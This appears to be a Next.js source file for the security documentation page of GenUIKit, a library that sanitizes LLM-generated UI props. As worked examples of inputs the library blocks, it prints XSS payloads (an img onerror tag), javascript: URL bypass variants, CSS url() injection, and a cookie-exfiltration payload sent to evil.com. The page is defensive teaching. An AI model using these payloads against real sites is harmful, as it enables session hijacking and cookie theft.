'use client';

import { CodeBlock, InlineCode } from '@/components/docs/code-block';
import { OnThisPage } from '@/components/docs/on-this-page';

const headings = [
  { id: 'why-security', text: 'Why Security Matters', level: 2 },
  { id: 'safe-schemas', text: 'Safe Schema Builders', level: 2 },
  { id: 'safe-string', text: 'safeString()', level: 3 },
  { id: 'safe-url', text: 'safeUrl()', level: 3 },
  { id: 'safe-html', text: 'safeHtml()', level: 3 },
  { id: 'safe-css-class', text: 'safeCssClass()', level: 3 },
  { id: 'security-policy', text: 'Security Policy', level: 2 },
  { id: 'html-sanitization', text: 'HTML Sanitization', level: 2 },
  { id: 'url-validation', text: 'URL Validation', level: 2 },
  { id: 'adapters-security', text: 'Adapters Use Security Automatically', level: 2 },
];

export default function SecurityPage() {
  return (
    <div className="flex gap-8">
      <div className="min-w-0 flex-1">
        <h1 className="text-4xl font-bold text-text-primary mb-4">Security</h1>
        <p className="text-lg text-text-secondary mb-10">
          Every string produced by an LLM is untrusted input. GenUIKit sanitizes and validates
          all values at the schema level so malicious output never reaches your UI.
        </p>

        {/* Why Security Matters */}
        <section id="why-security" className="mb-12">
          <h2 className="text-2xl font-semibold text-text-primary mb-4">Why Security Matters</h2>
          <p className="text-text-secondary mb-4">
            LLMs do not have intentions, but they can be manipulated. Prompt injection, jailbreaks,
            and even ordinary hallucinations can cause a model to emit HTML tags, dangerous URLs,
            or CSS injection payloads. If your app renders that output without sanitization, you
            have a live XSS vulnerability.
          </p>

          <div className="rounded-lg border border-border bg-surface-card p-5 mb-6">
            <h3 className="text-sm font-semibold text-text-primary mb-3">Attack surfaces in generative UI</h3>
            <ul className="space-y-2 text-text-secondary text-sm">
              <li className="flex items-start gap-2">
                <span className="text-red-400 font-bold mt-0.5">XSS</span>
                <span>
                  An LLM returns <InlineCode>{'<img src=x onerror=alert(1)>'}</InlineCode> as
                  a &quot;title&quot; field. Without stripping, the browser executes the script.
                </span>
              </li>
              <li className="flex items-start gap-2">
                <span className="text-red-400 font-bold mt-0.5">URL injection</span>
                <span>
                  A link field contains <InlineCode>javascript:alert(document.cookie)</InlineCode>.
                  Clicking it runs arbitrary code in the user&apos;s session.
                </span>
              </li>
              <li className="flex items-start gap-2">
                <span className="text-red-400 font-bold mt-0.5">CSS injection</span>
                <span>
                  A className field contains <InlineCode>{'x; background: url(evil.com/steal)'}</InlineCode>.
                  The browser fetches the URL, leaking context.
                </span>
              </li>
            </ul>
          </div>

          <p className="text-text-secondary mb-4">
            GenUIKit takes a <strong className="text-text-primary">defense-in-depth</strong> approach.
            Every safe schema builder strips, validates, and truncates in a single Zod transform-pipe
            chain. Even if one layer is bypassed, the next catches it. You never need to remember to
            call a sanitizer manually because the schemas do it for you.
          </p>
        </section>

        {/* Safe Schema Builders */}
        <section id="safe-schemas" className="mb-12">
          <h2 className="text-2xl font-semibold text-text-primary mb-4">Safe Schema Builders</h2>
          <p className="text-text-secondary mb-6">
            GenUIKit exports four builder functions that return Zod schemas with built-in sanitization.
            Use them anywhere you define props that accept LLM-generated content.
          </p>

          <CodeBlock
            language="typescript"
            code={`import { safeString, safeUrl, safeHtml, safeCssClass } from '@genuikit/core';`}
          />

          {/* safeString */}
          <div id="safe-string" className="mt-8 mb-10">
            <h3 className="text-lg font-medium text-text-primary mb-2">
              <InlineCode>safeString(options?)</InlineCode>
            </h3>
            <p className="text-text-secondary mb-3">
              Strips all HTML tags, removes control characters (null bytes, etc.), and truncates
              to a maximum length. This is the default builder for any plain-text field.
            </p>

            <div className="rounded-lg border border-border bg-surface-card p-4 mb-4">
              <h4 className="text-xs font-semibold uppercase tracking-wider text-text-secondary mb-2">Options</h4>
              <ul className="space-y-1 text-sm text-text-secondary">
                <li><InlineCode>maxLength</InlineCode> -- Maximum string length after sanitization. Default: <InlineCode>10,000</InlineCode></li>
                <li><InlineCode>policy</InlineCode> -- Custom <InlineCode>SecurityPolicyConfig</InlineCode> to override defaults.</li>
              </ul>
            </div>

            <CodeBlock
              language="typescript"
              filename="safeString example"
              code={`import { safeString } from '@genuikit/core';

const titleSchema = safeString({ maxLength: 200 });

// LLM returns a XSS payload as the title:
titleSchema.parse('<img src=x onerror=alert(1)>Hello');
// => "Hello"  (tags stripped, text preserved)

titleSchema.parse('Normal title');
// => "Normal title"  (unchanged)

titleSchema.parse('A'.repeat(500));
// => "AAA...A"  (truncated to 200 chars)`}
            />
          </div>

          {/* safeUrl */}
          <div id="safe-url" className="mb-10">
            <h3 className="text-lg font-medium text-text-primary mb-2">
              <InlineCode>safeUrl(options?)</InlineCode>
            </h3>
            <p className="text-text-secondary mb-3">
              Validates URLs against a scheme allowlist and blocklist. Blocks <InlineCode>javascript:</InlineCode>,{' '}
              <InlineCode>data:</InlineCode>, <InlineCode>vbscript:</InlineCode>, and <InlineCode>blob:</InlineCode>{' '}
              schemes by default. Normalizes the URL using the built-in <InlineCode>URL</InlineCode> constructor.
            </p>

            <div className="rounded-lg border border-border bg-surface-card p-4 mb-4">
              <h4 className="text-xs font-semibold uppercase tracking-wider text-text-secondary mb-2">Options</h4>
              <ul className="space-y-1 text-sm text-text-secondary">
                <li><InlineCode>allowedSchemes</InlineCode> -- Override allowed schemes. Default: <InlineCode>['https', 'http', 'mailto']</InlineCode></li>
                <li><InlineCode>policy</InlineCode> -- Custom <InlineCode>SecurityPolicyConfig</InlineCode>.</li>
              </ul>
            </div>

            <CodeBlock
              language="typescript"
              filename="safeUrl example"
              code={`import { safeUrl } from '@genuikit/core';

const linkSchema = safeUrl();

linkSchema.parse('https://example.com/page');
// => "https://example.com/page"  (valid, normalized)

linkSchema.parse('javascript:alert(1)');
// => throws ZodError: URL scheme "javascript" is blocked

// Case tricks don't work either:
linkSchema.parse('jAvAsCrIpT:alert(1)');
// => throws ZodError: URL scheme "javascript" is blocked

// Null-byte bypass attempt:
linkSchema.parse('java\\x00script:alert(1)');
// => throws ZodError: URL scheme "javascript" is blocked`}
            />
          </div>

          {/* safeHtml */}
          <div id="safe-html" className="mb-10">
            <h3 className="text-lg font-medium text-text-primary mb-2">
              <InlineCode>safeHtml(options?)</InlineCode>
            </h3>
            <p className="text-text-secondary mb-3">
              Strips all tags except an allowlist of safe formatting tags. All attributes are removed
              from allowed tags, preventing event handler injection like <InlineCode>onload</InlineCode> or{' '}
              <InlineCode>onerror</InlineCode>.
            </p>

            <div className="rounded-lg border border-border bg-surface-card p-4 mb-4">
              <h4 className="text-xs font-semibold uppercase tracking-wider text-text-secondary mb-2">Options</h4>
              <ul className="space-y-1 text-sm text-text-secondary">
                <li><InlineCode>allowedTags</InlineCode> -- Tags to keep. Default: <InlineCode>b, i, em, strong, u, br, p, ul, ol, li, h1-h6, code, pre, blockquote, span, div, a, table, thead, tbody, tr, th, td</InlineCode></li>
                <li><InlineCode>maxLength</InlineCode> -- Maximum output length. Default: <InlineCode>50,000</InlineCode></li>
                <li><InlineCode>policy</InlineCode> -- Custom <InlineCode>SecurityPolicyConfig</InlineCode>.</li>
              </ul>
            </div>

            <CodeBlock
              language="typescript"
              filename="safeHtml example"
              code={`import { safeHtml } from '@genuikit/core';

const descriptionSchema = safeHtml();

descriptionSchema.parse('<b>Bold</b> and <script>alert(1)</script> text');
// => "<b>Bold</b> and  text"  (script tag stripped)

descriptionSchema.parse('<a href="x" onclick="steal()">Click</a>');
// => "<a>Click</a>"  (all attributes removed)

descriptionSchema.parse('<img src=x onerror=alert(1)>');
// => ""  (img not in allowlist, stripped entirely)`}
            />
          </div>

          {/* safeCssClass */}
          <div id="safe-css-class" className="mb-10">
            <h3 className="text-lg font-medium text-text-primary mb-2">
              <InlineCode>safeCssClass(options?)</InlineCode>
            </h3>
            <p className="text-text-secondary mb-3">
              Validates CSS class strings against a character pattern that allows standard classes,
              Tailwind utilities, CSS modules, and BEM notation. Blocks CSS injection patterns
              like <InlineCode>expression()</InlineCode>, <InlineCode>url()</InlineCode>,
              and <InlineCode>behavior()</InlineCode>.
            </p>

            <div className="rounded-lg border border-border bg-surface-card p-4 mb-4">
              <h4 className="text-xs font-semibold uppercase tracking-wider text-text-secondary mb-2">Options</h4>
              <ul className="space-y-1 text-sm text-text-secondary">
                <li><InlineCode>maxLength</InlineCode> -- Maximum class string length. Default: <InlineCode>256</InlineCode></li>
                <li><InlineCode>policy</InlineCode> -- Custom <InlineCode>SecurityPolicyConfig</InlineCode>.</li>
              </ul>
            </div>

            <CodeBlock
              language="typescript"
              filename="safeCssClass example"
              code={`import { safeCssClass } from '@genuikit/core';

const classSchema = safeCssClass();

classSchema.parse('flex items-center gap-2 text-blue-500');
// => "flex items-center gap-2 text-blue-500"  (valid Tailwind)

classSchema.parse('md:grid md:grid-cols-2 hover:bg-[#f0f0f0]');
// => "md:grid md:grid-cols-2 hover:bg-[#f0f0f0]"  (valid)

classSchema.parse('x; expression(alert(1))');
// => throws ZodError: CSS class contains forbidden pattern

classSchema.parse('bg url(https://evil.com/steal)');
// => throws ZodError: CSS class contains forbidden pattern`}
            />
          </div>
        </section>

        {/* Security Policy */}
        <section id="security-policy" className="mb-12">
          <h2 className="text-2xl font-semibold text-text-primary mb-4">Security Policy</h2>
          <p className="text-text-secondary mb-4">
            All safe schema builders share a common configuration object. The default policy
            covers most use cases, but you can customize it using the immutable{' '}
            <InlineCode>SecurityPolicy</InlineCode> class and its <InlineCode>.with()</InlineCode> builder.
          </p>

          <CodeBlock
            language="typescript"
            filename="default policy"
            code={`import { DEFAULT_SECURITY_POLICY } from '@genuikit/core';

// The default configuration:
// {
//   maxStringLength:   10_000,
//   maxUrlLength:      2_083,
//   maxCssClassLength: 256,
//   maxHtmlLength:     50_000,
//   allowedUrlSchemes: ['https', 'http', 'mailto'],
//   blockedUrlSchemes: ['javascript', 'data', 'vbscript', 'blob'],
//   allowedHtmlTags:   ['b', 'i', 'em', 'strong', 'u', 'br', ...],
//   stripHtml:         true,
//   cssClassPattern:   /^[a-zA-Z0-9_\\-\\s:./[\\]#%,!@]+$/,
// }`}
          />

          <h3 className="text-lg font-medium text-text-primary mb-2 mt-8">
            Customizing with <InlineCode>.with()</InlineCode>
          </h3>
          <p className="text-text-secondary mb-3">
            The <InlineCode>.with()</InlineCode> method returns a new <InlineCode>SecurityPolicy</InlineCode>{' '}
            instance with your overrides merged in. The original policy is never mutated.
          </p>

          <CodeBlock
            language="typescript"
            filename="custom policy"
            code={`import { DEFAULT_SECURITY_POLICY, safeString, safeUrl } from '@genuikit/core';

// Create a strict policy for short-form content
const strictPolicy = DEFAULT_SECURITY_POLICY.with({
  maxStringLength: 1_000,
  allowedUrlSchemes: ['https'],  // HTTPS only, no http or mailto
});

// Pass the policy to any safe builder
const titleSchema = safeString({
  maxLength: 200,
  policy: strictPolicy.config,
});

const linkSchema = safeUrl({
  policy: strictPolicy.config,
});

// http:// links are now rejected:
linkSchema.parse('http://example.com');
// => throws ZodError: URL scheme "http" is not in the allowed list`}
          />

          <div className="rounded-lg border border-border bg-surface-card p-4 mt-6">
            <h4 className="text-xs font-semibold uppercase tracking-wider text-text-secondary mb-2">Configuration options</h4>
            <div className="overflow-x-auto">
              <table className="w-full text-sm">
                <thead>
                  <tr className="border-b border-border">
                    <th className="text-left py-2 pr-4 text-text-primary font-medium">Option</th>
                    <th className="text-left py-2 pr-4 text-text-primary font-medium">Default</th>
                    <th className="text-left py-2 text-text-primary font-medium">Description</th>
                  </tr>
                </thead>
                <tbody className="text-text-secondary">
                  <tr className="border-b border-border/50">
                    <td className="py-2 pr-4"><InlineCode>maxStringLength</InlineCode></td>
                    <td className="py-2 pr-4">10,000</td>
                    <td className="py-2">Max chars for safeString output</td>
                  </tr>
                  <tr className="border-b border-border/50">
                    <td className="py-2 pr-4"><InlineCode>maxUrlLength</InlineCode></td>
                    <td className="py-2 pr-4">2,083</td>
                    <td className="py-2">Max URL length (matches IE limit)</td>
                  </tr>
                  <tr className="border-b border-border/50">
                    <td className="py-2 pr-4"><InlineCode>maxHtmlLength</InlineCode></td>
                    <td className="py-2 pr-4">50,000</td>
                    <td className="py-2">Max chars for safeHtml output</td>
                  </tr>
                  <tr className="border-b border-border/50">
                    <td className="py-2 pr-4"><InlineCode>maxCssClassLength</InlineCode></td>
                    <td className="py-2 pr-4">256</td>
                    <td className="py-2">Max CSS class string length</td>
                  </tr>
                  <tr className="border-b border-border/50">
                    <td className="py-2 pr-4"><InlineCode>allowedUrlSchemes</InlineCode></td>
                    <td className="py-2 pr-4">https, http, mailto</td>
                    <td className="py-2">Schemes that pass URL validation</td>
                  </tr>
                  <tr className="border-b border-border/50">
                    <td className="py-2 pr-4"><InlineCode>blockedUrlSchemes</InlineCode></td>
                    <td className="py-2 pr-4">javascript, data, vbscript, blob</td>
                    <td className="py-2">Schemes rejected before allowlist check</td>
                  </tr>
                  <tr className="border-b border-border/50">
                    <td className="py-2 pr-4"><InlineCode>allowedHtmlTags</InlineCode></td>
                    <td className="py-2 pr-4">b, i, em, strong, ...</td>
                    <td className="py-2">Tags kept by safeHtml (attributes stripped)</td>
                  </tr>
                  <tr className="border-b border-border/50">
                    <td className="py-2 pr-4"><InlineCode>stripHtml</InlineCode></td>
                    <td className="py-2 pr-4">true</td>
                    <td className="py-2">Whether safeString strips all HTML</td>
                  </tr>
                  <tr>
                    <td className="py-2 pr-4"><InlineCode>cssClassPattern</InlineCode></td>
                    <td className="py-2 pr-4">Regex</td>
                    <td className="py-2">Allowed character pattern for CSS classes</td>
                  </tr>
                </tbody>
              </table>
            </div>
          </div>
        </section>

        {/* HTML Sanitization */}
        <section id="html-sanitization" className="mb-12">
          <h2 className="text-2xl font-semibold text-text-primary mb-4">HTML Sanitization</h2>
          <p className="text-text-secondary mb-4">
            Under the hood, the safe schema builders use a set of pure sanitization functions. These
            are also exported for direct use if you need lower-level control.
          </p>

          <div className="rounded-lg border border-red-500/20 bg-red-500/5 p-5 mb-6">
            <h3 className="text-sm font-semibold text-red-400 mb-2">Why not regex?</h3>
            <p className="text-text-secondary text-sm">
              A common approach is to strip HTML with a regex like{' '}
              <InlineCode>{'/<[^>]*>/g'}</InlineCode>. This is dangerous for two reasons: it is vulnerable
              to ReDoS (Regular Expression Denial of Service) attacks with crafted input like a long
              sequence of unclosed angle brackets, and it can be tricked by malformed HTML that real
              browsers still parse. GenUIKit uses an O(n) character-by-character state machine that
              is immune to both problems.
            </p>
          </div>

          <h3 className="text-lg font-medium text-text-primary mb-2">Exported functions</h3>

          <CodeBlock
            language="typescript"
            filename="sanitize functions"
            code={`import {
  stripHtmlTags,
  escapeHtml,
  sanitizeString,
  sanitizeHtml,
} from '@genuikit/core';

// stripHtmlTags — O(n) state-machine HTML tag removal
stripHtmlTags('<b>Hello</b> <script>alert(1)</script>World');
// => "Hello World"

// escapeHtml — convert special chars to HTML entities
escapeHtml('<img src="x">');
// => "&lt;img src=&quot;x&quot;&gt;"

// sanitizeString — full pipeline: control chars + strip HTML + truncate
sanitizeString('Hello\\x00World<b>!</b>', DEFAULT_SECURITY_POLICY.config);
// => "HelloWorld!"

// sanitizeHtml — keep only allowlisted tags, strip all attributes
sanitizeHtml(
  '<b>bold</b><script>bad</script><a href="x" onclick="y">link</a>',
  ['b', 'a'],  // allowed tags
  50_000,      // max length
);
// => "<b>bold</b><a>link</a>"`}
          />

          <p className="text-text-secondary mt-4">
            The state machine approach guarantees O(n) performance regardless of input. There is
            no backtracking, no catastrophic matching, and no way to trigger exponential processing
            time. This is critical for production systems where an attacker controls the input.
          </p>
        </section>

        {/* URL Validation */}
        <section id="url-validation" className="mb-12">
          <h2 className="text-2xl font-semibold text-text-primary mb-4">URL Validation</h2>
          <p className="text-text-secondary mb-4">
            The <InlineCode>validateUrl</InlineCode> function implements a defense-in-depth pipeline
            that catches common bypass techniques used to sneak dangerous schemes past filters.
          </p>

          <CodeBlock
            language="typescript"
            filename="URL validation pipeline"
            code={`import { validateUrl, DEFAULT_SECURITY_POLICY } from '@genuikit/core';

const policy = DEFAULT_SECURITY_POLICY.config;

// Step 1: Remove control characters and trim whitespace
// Step 2: Check length against maxUrlLength (2,083)
// Step 3: Reject empty strings
// Step 4: Normalize and check scheme against blocklist
// Step 5: Parse with URL constructor, verify against allowlist

// Standard valid URL
validateUrl('https://example.com', policy);
// => { valid: true, sanitized: "https://example.com/" }

// Blocked scheme
validateUrl('javascript:alert(1)', policy);
// => { valid: false, violation: { message: 'URL scheme "javascript" is blocked' } }`}
          />

          <h3 className="text-lg font-medium text-text-primary mb-3 mt-8">Bypass attempts that are caught</h3>

          <CodeBlock
            language="typescript"
            filename="bypass attempts"
            code={`// Case variation — normalized before checking
validateUrl('jAvAsCrIpT:alert(1)', policy);
// => blocked: scheme "javascript" is blocked

// Null bytes — stripped before scheme extraction
validateUrl('java\\x00script:alert(1)', policy);
// => blocked: scheme "javascript" is blocked

// Tab/newline insertion — whitespace removed from scheme
validateUrl('java\\tscript:alert(1)', policy);
// => blocked: scheme "javascript" is blocked

// Data URIs — blocked by default
validateUrl('data:text/html,<script>alert(1)</script>', policy);
// => blocked: scheme "data" is blocked

// VBScript (legacy IE attack vector)
validateUrl('vbscript:MsgBox("xss")', policy);
// => blocked: scheme "vbscript" is blocked

// Relative URLs are allowed (no scheme to exploit)
validateUrl('/safe/path', policy);
// => { valid: true, sanitized: "/safe/path" }

validateUrl('#anchor', policy);
// => { valid: true, sanitized: "#anchor" }`}
          />
        </section>

        {/* Adapters Use Security Automatically */}
        <section id="adapters-security" className="mb-12">
          <h2 className="text-2xl font-semibold text-text-primary mb-4">Adapters Use Security Automatically</h2>
          <p className="text-text-secondary mb-4">
            If you use any of the pre-built adapters (shadcn/ui, Tailwind, MUI), all component
            schemas already use the safe builders internally. You get XSS protection, URL
            validation, and CSS injection blocking with zero configuration.
          </p>

          <CodeBlock
            language="typescript"
            filename="adapter internals (you don't need to write this)"
            code={`// Inside @genuikit/adapters — this is already done for you
import { safeString, safeUrl, safeCssClass } from '@genuikit/core';

// Every text prop uses safeString
const childrenSchema = safeString({ maxLength: 50_000 });

// Every URL prop uses safeUrl
const srcSchema = safeUrl();

// Every className prop uses safeCssClass
const classNameSchema = safeCssClass();`}
          />

          <p className="text-text-secondary mt-4 mb-4">
            This means if an LLM produces a component call like:
          </p>

          <CodeBlock
            language="json"
            filename="malicious LLM output"
            code={`{
  "type": "Button",
  "props": {
    "children": "<img src=x onerror=alert(document.cookie)>Click me",
    "href": "javascript:fetch('https://evil.com?c='+document.cookie)",
    "className": "btn; background: url(https://evil.com/exfil)"
  }
}`}
          />

          <p className="text-text-secondary mt-4">
            The adapter schemas will automatically:
          </p>

          <ul className="space-y-2 text-text-secondary mt-3 mb-4">
            <li className="flex items-start gap-2">
              <span className="text-accent font-bold mt-0.5">1.</span>
              <span>Strip the <InlineCode>{'<img>'}</InlineCode> tag from children, producing just &quot;Click me&quot;</span>
            </li>
            <li className="flex items-start gap-2">
              <span className="text-accent font-bold mt-0.5">2.</span>
              <span>Reject the <InlineCode>javascript:</InlineCode> URL with a validation error</span>
            </li>
            <li className="flex items-start gap-2">
              <span className="text-accent font-bold mt-0.5">3.</span>
              <span>Reject the CSS class string that contains <InlineCode>url()</InlineCode></span>
            </li>
          </ul>

          <div className="rounded-lg border border-primary/20 bg-primary/5 p-5 mt-6">
            <h3 className="text-sm font-semibold text-primary mb-2">Building custom schemas?</h3>
            <p className="text-text-secondary text-sm">
              If you write your own component schemas instead of using an adapter, use the safe
              builders for every string field that receives LLM output. A plain{' '}
              <InlineCode>z.string()</InlineCode> gives you no protection. Replace it with{' '}
              <InlineCode>safeString()</InlineCode>, <InlineCode>safeUrl()</InlineCode>, or{' '}
              <InlineCode>safeCssClass()</InlineCode> depending on the field type.
            </p>
          </div>
        </section>
      </div>

      <OnThisPage headings={headings} />
    </div>
  );
}
